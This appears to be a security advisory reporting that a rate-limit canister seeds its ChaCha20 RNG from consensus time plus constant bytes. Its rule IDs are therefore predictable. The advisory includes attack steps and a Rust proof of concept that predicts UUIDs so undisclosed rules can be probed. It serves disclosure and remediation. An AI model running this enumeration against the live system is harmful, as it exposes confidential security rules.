### Title
Predictable Time-Based RNG Seed Enables Enumeration of Confidential Rate-Limit Rule IDs - (File: `rs/boundary_node/rate_limits/canister/random.rs`)

---

### Summary

The rate-limit canister registers a global `getrandom` implementation seeded exclusively from `ic_cdk::api::time()` (IC consensus time), with the remaining 24 bytes of the 32-byte seed hardcoded as the constant `0x2a` (42). All `RuleId` UUIDs generated for rate-limit rules are therefore fully predictable by any observer who knows the canister's initialization time, undermining the confidentiality model that protects undisclosed security rules.

---

### Finding Description

In `rs/boundary_node/rate_limits/canister/random.rs`, the thread-local `RNG` is initialized at canister startup as follows:

```rust
thread_local! {
  static RNG: RefCell<ChaCha20Rng> = {
    let mut seed = [42; 32];
    seed[..8].copy_from_slice(&time().to_le_bytes());
    RefCell::new(ChaCha20Rng::from_seed(seed))
  };
}
``` [1](#0-0) 

Only the first 8 bytes of the 32-byte seed are derived from `time()` (IC consensus time in nanoseconds). The remaining 24 bytes are the constant `42`. This `RNG` is then registered as the global `getrandom` implementation for the entire canister via `getrandom::register_custom_getrandom!`: [2](#0-1) 

The `generate_random_uuid()` function in `add_config.rs` calls `getrandom::getrandom` to produce `RuleId` UUIDs for every new rate-limit rule:

```rust
fn generate_random_uuid() -> Result<Uuid, anyhow::Error> {
    let mut buf = [0_u8; 16];
    getrandom::getrandom(&mut buf)
        ...
    let uuid = Uuid::from_slice(&buf)...;
    Ok(uuid)
}
``` [3](#0-2) 

These UUIDs become the `RuleId` values stored in stable memory and returned to callers: [4](#0-3) 

The `RuleId` type wraps a `Uuid` and is used as the primary key for all rule lookups: [5](#0-4) 

---

### Impact Explanation

The rate-limit canister implements a confidentiality model: rules are stored with an `is_disclosed` flag, and undisclosed rules are redacted in responses to unauthorized callers. The design intent is that security-sensitive rate-limit rules remain secret until explicitly disclosed via `disclose_rules`. [6](#0-5) 

Because the entire RNG state is determined by the canister's initialization time (a single 64-bit value with 24 constant bytes), an unprivileged attacker can:

1. Observe the canister's initialization time `T` from the IC (consensus time is public and deterministic).
2. Reconstruct the exact seed: `seed = [42; 32]` with `seed[0..8] = T.to_le_bytes()`.
3. Instantiate `ChaCha20Rng::from_seed(seed)` locally.
4. Infer how many UUIDs have been generated from the public version counter (each `add_config` call increments the version and generates UUIDs for new rules).
5. Advance the local RNG by the same number of steps to predict all future `RuleId` values.
6. Call the public `get_rule_by_id` query with predicted IDs. Even if the rule content is redacted, a non-`NotFound` response confirms the existence of an undisclosed security rule.

This breaks the confidentiality guarantee for undisclosed rate-limit rules, allowing adversaries to discover new security rules before they are publicly disclosed — directly analogous to the NFT report's ability to pre-compute rare token positions before the launch.

---

### Likelihood Explanation

- `ic_cdk::api::time()` returns the IC consensus time, which is deterministic, identical across all replicas, and observable by any caller via canister queries or block inspection.
- The canister's initialization time is recorded in the IC's state and can be retrieved without any special privileges.
- The remaining 24 bytes of the seed are the constant `42`, providing zero additional entropy.
- The RNG is initialized once at canister startup and never reseeded, so the full future output stream is fixed from that moment.
- No privileged access is required; any ingress sender or query caller can execute this attack.

---

### Recommendation

Replace the time-based seed with cryptographically secure randomness from the IC management canister's `raw_rand` endpoint, which derives randomness from the IC's threshold random beacon. Since `raw_rand` is asynchronous, it should be called during a post-init async task (similar to how NNS governance seeds its RNG): [7](#0-6) 

Until `raw_rand` is available, at minimum mix in additional entropy sources (canister ID, a counter, caller principal) to reduce predictability. The current construction of `[42; 32]` with only 8 bytes of time is insufficient for any security-sensitive UUID generation.

---

### Proof of Concept

```rust
// Attacker reconstructs the canister's RNG state off-chain:
use rand_chacha::ChaCha20Rng;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use uuid::Uuid;

fn predict_rule_ids(init_time_nanos: u64, num_uuids_already_generated: usize, num_to_predict: usize) -> Vec<Uuid> {
    // Replicate the seed construction from random.rs
    let mut seed = [42u8; 32];
    seed[..8].copy_from_slice(&init_time_nanos.to_le_bytes());
    let mut rng = ChaCha20Rng::from_seed(seed);

    // Advance past already-generated UUIDs (16 bytes each)
    let mut discard = [0u8; 16];
    for _ in 0..num_uuids_already_generated {
        rng.fill_bytes(&mut discard);
    }

    // Predict future RuleId UUIDs
    let mut predicted = Vec::new();
    for _ in 0..num_to_predict {
        let mut buf = [0u8; 16];
        rng.fill_bytes(&mut buf);
        predicted.push(Uuid::from_slice(&buf).unwrap());
    }
    predicted
}

// Then call get_rule_by_id on the IC with each predicted UUID.
// A non-NotFound response reveals an undisclosed rule exists at that ID.
```

The attacker obtains `init_time_nanos` from the IC's canister creation record and `num_uuids_already_generated` from the public version counter (each version increment corresponds to at least one new UUID per new rule in that config).

### Citations

**File:** rs/boundary_node/rate_limits/canister/random.rs (L8-14)
```rust
thread_local! {
  static RNG: RefCell<ChaCha20Rng> = {
    let mut seed = [42; 32];
    seed[..8].copy_from_slice(&time().to_le_bytes());
    RefCell::new(ChaCha20Rng::from_seed(seed))
  };
}
```

**File:** rs/boundary_node/rate_limits/canister/random.rs (L31-36)
```rust
#[cfg(all(
    target_arch = "wasm32",
    target_vendor = "unknown",
    target_os = "unknown"
))]
getrandom::register_custom_getrandom!(custom_getrandom_bytes_impl);
```

**File:** rs/boundary_node/rate_limits/canister/add_config.rs (L112-121)
```rust
            let rule_id = if let Some(rule_idx) = existing_rule_idx {
                current_config.rule_ids[rule_idx]
            } else {
                let rule_id = RuleId(generate_random_uuid()?);
                // If the generated UUID already exists, return the error (practically this should never happen).
                if self.canister_api.get_rule(&rule_id).is_some() {
                    return Err(AddConfigError::Internal(anyhow!(
                        "Failed to generate a new uuid {rule_id}, please retry the operation."
                    )));
                }
```

**File:** rs/boundary_node/rate_limits/canister/add_config.rs (L126-134)
```rust
                if let Some(incident) = existing_incident {
                    // A new rule can't be linked to a disclosed incident
                    if incident.is_disclosed {
                        Err(AddConfigError::LinkingRuleToDisclosedIncident {
                            index: rule_idx,
                            incident_id: input_rule.incident_id,
                        })?;
                    }
                }
```

**File:** rs/boundary_node/rate_limits/canister/add_config.rs (L186-193)
```rust
fn generate_random_uuid() -> Result<Uuid, anyhow::Error> {
    let mut buf = [0_u8; 16];
    getrandom::getrandom(&mut buf)
        .map_err(|e| anyhow::anyhow!(e))
        .context("Failed to generate random bytes")?;
    let uuid = Uuid::from_slice(&buf).context("Failed to create UUID from bytes")?;
    Ok(uuid)
}
```

**File:** rs/boundary_node/rate_limits/canister/types.rs (L15-19)
```rust
#[derive(Debug, Clone, Copy, PartialEq, Hash, Eq, Serialize, Deserialize)]
pub struct RuleId(pub Uuid);

#[derive(Debug, Clone, Copy, PartialEq, Hash, Eq, Serialize, Deserialize)]
pub struct IncidentId(pub Uuid);
```

**File:** rs/nns/governance/src/timer_tasks/seeding.rs (L31-42)
```rust
        let result: Result<Vec<u8>, (Option<i32>, String)> = env
            .call_canister_method(IC_00, "raw_rand", Encode!().unwrap())
            .await;

        let next_delay = match result {
            Ok(bytes) => {
                let seed = Decode!(&bytes, [u8; 32]).unwrap();
                self.governance.with_borrow_mut(|governance| {
                    governance.seed_rng(seed);
                });
                SEEDING_INTERVAL
            }
```
